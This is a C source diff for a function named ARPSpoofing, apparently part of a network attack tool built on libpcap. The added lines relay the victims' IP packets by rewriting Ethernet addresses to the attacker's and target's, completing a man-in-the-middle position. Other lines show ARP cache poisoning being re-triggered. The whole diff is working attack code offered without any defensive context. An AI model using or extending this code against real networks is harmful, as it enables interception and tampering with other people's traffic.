@@ -43,8 +43,7 @@ void *ARPSpoofing(void *)
     thread_idx++;
     pthread_mutex_unlock(&mutex);
     
-    LOG(INFO) << "pcap_open_live";
-    if((handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf))==NULL)
+    if((handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf))==NULL)
     {
         LOG(FATAL) << "pcap_open_live : failed";
         return NULL;
@@ -72,16 +71,24 @@ void *ARPSpoofing(void *)
         }
 
         eth_hdr = (struct ether_header *) pkt;
+
         if(ntohs(eth_hdr->ether_type) == ETHERTYPE_IP)
         {
-            
+            memcpy(eth_hdr->ether_shost, &attacker_ha, HW_ADDR_LEN);
+            memcpy(eth_hdr->ether_dhost, &tha, HW_ADDR_LEN);
+
+            if(pcap_sendpacket(handle, pkt, header->len) != 0)
+            {
+                LOG(FATAL) << "pcap_sendpacket : failed";
+                return NULL;
+            }    
         }
 
         if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP)
         {
             arppkt = (ARPpkt *) pkt;
-            if((equalHWaddr(arppkt->arp_addr.sha, tha) && equalIPaddr(arppkt->arp_addr.tip, sip)) ||\
-                (equalHWaddr(arppkt->arp_addr.sha, sha) && equalIPaddr(arppkt->arp_addr.tip, tip)))
+            if( (equalHWaddr(arppkt->arp_addr.sha, tha) && equalIPaddr(arppkt->arp_addr.tip, sip)) ||\
+                (equalHWaddr(arppkt->arp_addr.sha, sha) && equalIPaddr(arppkt->arp_addr.tip, tip)) )
             {
                 if(!ARPCachePoisoning(handle, sha, sip, attacker_ha, tip))
                 {
